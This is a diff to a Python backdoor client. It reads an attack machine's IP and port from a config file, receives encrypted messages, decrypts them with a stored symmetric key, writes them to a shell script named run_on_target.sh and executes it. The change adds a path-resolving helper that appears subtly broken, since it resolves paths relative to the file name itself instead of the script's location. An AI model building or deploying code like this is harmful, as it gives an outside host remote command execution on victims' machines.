@@ -8,7 +8,13 @@ import json
 # REACH_IP = 'localhost' # IP of attack machine
 # REACH_PORT = 5050
 # read in config vars
-with open("client_config.json") as config_f:
+
+def convert_path(file_name):
+    script_dir = os.path.dirname(os.path.abspath(file_name))
+    file_path = os.path.join(script_dir, file_name)
+    return file_path
+
+with open(convert_path("client_config.json")) as config_f:
     config = json.load(config_f)
 
 REACH_IP = config['REACH_IP']
@@ -93,7 +99,7 @@ def execute_msg(message):
     print(f"received:\n{message}\n==")
     # create shell script from the message
     script_fname = "run_on_target.sh"
-    with open(script_fname, "w") as f:
+    with open(convert_path(script_fname), "w") as f:
         f.write(message)
     # run the shell script
     run_output = run_shell_script(script_fname)
@@ -114,7 +120,7 @@ def run_backdoor(ip, port):
     )
 
     # decrypt message
-    symm_key = read_key("symm_key.txt")
+    symm_key = read_key(convert_path("symm_key.txt"))
     message = decrypt_ct(symmetric_key=symm_key,
                msg_ct=in_ct)
 
